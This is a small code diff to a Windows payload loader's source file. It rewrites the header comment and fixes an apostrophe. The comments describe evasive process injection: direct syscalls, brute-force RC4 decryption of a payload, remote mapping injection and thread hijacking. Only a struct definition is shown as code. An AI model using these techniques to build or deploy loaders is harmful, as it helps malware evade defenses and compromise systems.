@@ -1,9 +1,15 @@
 ﻿/*
-    file that contains most of the loader's functionality:
-        - InitializeSyscalls: used to fetch the addresses of the syscalls / WinAPIs used
-        - GetRemoteProcessHandle: used to get the target process handle
-        - Rc4EncryptionViSystemFunc032: used to decrypt the payload by brute forcing the key
-        - RemoteMappingInjectionViaSyscalls: used to inject the payload after decrypting it to the target process
+    inject.c - Core loader logic
+    ---------------------------
+    Purpose:
+        - Implements the main loader functionality, including syscall and API initialization, process handle acquisition, RC4 decryption, and remote injection.
+    Main Functions:
+        - Initializes syscall and API tables for direct system call usage.
+        - Finds and opens the target process for injection.
+        - Decrypts the payload using RC4 encryption.
+        - Injects and hijacks threads in the target process to execute the payload.
+    Role in Project:
+        - Provides the core mechanisms for process injection and payload delivery, supporting the main loader flow.
 */
 
 #include <Windows.h>
@@ -271,7 +277,7 @@ BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DW
 typedef struct _OBJECT_ATTRIBUTES {
     ULONG           Length;
     HANDLE          RootDirectory;
-    PVOID           ObjectName;               // we’re not using names here, so PVOID is fine
+    PVOID           ObjectName;               // we're not using names here, so PVOID is fine
     ULONG           Attributes;
     PVOID           SecurityDescriptor;
     PVOID           SecurityQualityOfService;
